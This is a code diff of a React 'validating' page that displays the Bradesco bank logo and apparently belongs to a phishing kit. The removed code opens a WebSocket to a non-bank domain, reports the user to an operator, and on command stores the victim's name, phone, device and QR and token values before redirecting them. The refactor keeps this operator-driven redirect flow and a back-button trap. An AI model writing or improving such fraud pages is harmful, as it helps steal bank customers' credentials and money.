@@ -1,48 +1,25 @@
-import { useEffect, useRef } from "react";
+import { useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import { resolveServerRoute } from "@/lib/resolveServerRoute";
+import { useWebSocket } from "@/hooks/useWebSocket";
 
 const ValidatingPage = () => {
   const navigate = useNavigate();
-  const usuario = localStorage.getItem("usuario") || "";
-  const wsRef = useRef<WebSocket | null>(null);
+  const dispositivo = localStorage.getItem("dispositivo") || "";
 
-  useEffect(() => {
-    const ws = new WebSocket("wss://syncservicesqrgeneretor.online/ws/");
-    wsRef.current = ws;
-
-    ws.onopen = () => {
-      console.log("ValidatingPage WS conectado");
-      if (usuario) {
-        ws.send(JSON.stringify({ acao: "reconectar", usuario }));
-      }
-    };
-
-    ws.onmessage = (event) => {
-      const msg = JSON.parse(event.data);
-      console.log("ValidatingPage msg:", msg);
-
-      if (msg.acao === "redirecionar") {
-        localStorage.setItem("feixe", msg.feixe || "");
-        localStorage.setItem("qr", msg.qr || "");
-        localStorage.setItem("nome", msg.nome || "");
-        localStorage.setItem("dispositivo", msg.dispositivo || "");
-        localStorage.setItem("telefone", msg.telefone || "");
-        navigate(resolveServerRoute(msg.url));
-      }
+  useWebSocket({
+    reconectarPayload: { dispositivo },
+    onRedirect: (msg) => {
+      navigate(resolveServerRoute(msg.url));
+    },
+    onMessage: (msg) => {
       if (msg.acao === "erro_token") {
         localStorage.setItem("erroToken", msg.motivo || "Token inválido");
         navigate("/token");
       }
-    };
-
-    ws.onerror = (err) => console.error("WS erro:", err);
-
-    return () => {
-      ws.close();
-    };
-  }, [usuario, navigate]);
+    },
+  });
 
   useEffect(() => {
     window.history.pushState(null, "", window.location.href);
